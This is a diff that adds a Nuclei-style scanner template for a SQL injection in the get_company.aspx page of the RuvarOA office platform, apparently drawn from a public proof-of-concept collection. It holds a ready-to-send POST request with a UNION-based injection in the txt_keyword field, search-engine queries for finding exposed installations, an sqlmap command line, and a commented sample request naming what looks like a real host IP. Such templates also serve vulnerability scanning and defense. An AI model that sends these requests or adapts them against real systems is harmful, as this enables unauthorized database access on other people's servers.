@@ -1,0 +1,52 @@
+id: ruvaroa-txt_keyword-sqli
+info:
+  name: RuvarOA 协同办公平台 get_company.aspx - sqli
+  author: leadlife
+  severity: high
+  description: RuvarOA是由广州市璐华计算机科技有限公司开发的一款企业协同办公平台。该平台继承了传统OA产品的所有优秀特性，并在此基础上增加了更齐全的功能模块，极大地扩大了应用的覆盖面。
+  reference: 
+    - https://github.com/wy876/POC/blob/f438c90ba8c03d44841a8129daa16a8535cab132/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0/RuvarOA%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0%E5%A4%9A%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="txt_admin_key"
+    hunter-query: web.body="txt_admin_key"
+    sqlmap: sqlmap -r sqli.txt --batch --random-agent --dbms="Microsoft SQL Server"
+  tags: ruvaroa,sqli,oa
+
+http:
+  - raw:
+      - |
+        POST /ContractManage/get_company.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 495
+
+        __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1'+UNION+ALL+SELECT+@@version--+CwAf&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh=
+            
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'Microsoft','SQL Server')
+        condition: and
+
+# POST /ContractManage/get_company.aspx HTTP/1.1
+# Host: 121.8.91.35:89
+# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+# Connection: close
+# Content-Length: 536
+# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+# Accept-Encoding: gzip, deflate
+# Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+# Content-Type: application/x-www-form-urlencoded
+# Upgrade-Insecure-Requests: 1
+
+# __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=*&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh=
+
+
